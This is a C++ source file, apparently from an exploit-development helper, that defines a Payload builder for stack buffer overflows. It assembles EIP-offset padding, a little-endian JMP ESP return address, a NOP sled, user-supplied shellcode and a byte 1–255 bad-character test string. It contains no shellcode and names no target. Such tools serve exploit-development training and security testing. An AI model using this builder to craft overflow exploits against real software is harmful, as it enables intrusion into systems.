#include "Stages/Payload.hpp"

Payload* Payload::builder(Script* script)
{
    return new Payload(script);
}

Payload::Payload(Script* script)
{
    this->script = script;
    this->buffer = "";
}

std::string Payload::get()
{
    return this->buffer;
}

Payload* Payload::padding(char character)
{
    if (Application::eipOffset == std::string::npos)
        return this;

    std::string padding = "";
    for (uint32_t i = 0; i < Application::eipOffset; i++)
        padding += std::string(1, character);
    
    if (this->script != nullptr)
    {
        this->script->paddingCount = Application::eipOffset;
        this->script->paddingCharacter = character;
    }
    
    this->buffer += padding;
    return this;
}

Payload* Payload::eip()
{
    uint32_t jmpEsp = (uint32_t)Application::jmpEsp;

    std::string eip = "";
    for (int32_t i = 0; i < 4; i++)
        eip += std::string(1, (char)((jmpEsp >> (8* i)) & 0xff));
    
    if (this->script != nullptr)
        this->script->eip = jmpEsp;
    
    this->buffer += eip;
    return this;
}

Payload* Payload::nopSled(uint32_t length)
{
    std::string nop = "";
    for (uint32_t i = 0; i < length; i++)
        nop += std::string(1, '\x90');
    
    if (this->script != nullptr)
        this->script->nopSledCount = length;

    this->buffer += nop;
    return this;
}

Payload* Payload::payload(std::string input)
{
    if (this->script != nullptr)
        this->script->payload = input;

    this->buffer += input;
    return this;
}

Payload* Payload::badCharacters()
{
    for (uint32_t i = 1; i <= 255; i++)
    {
        // Set bad characters to NOP
        if (std::find(Application::badCharacters.begin(), Application::badCharacters.end(), (uint8_t)i) != Application::badCharacters.end())
        {
            this->buffer += std::string(1, '\x90');
            continue;
        }
        this->buffer += std::string(1, (char)i);
    }
    return this;
}
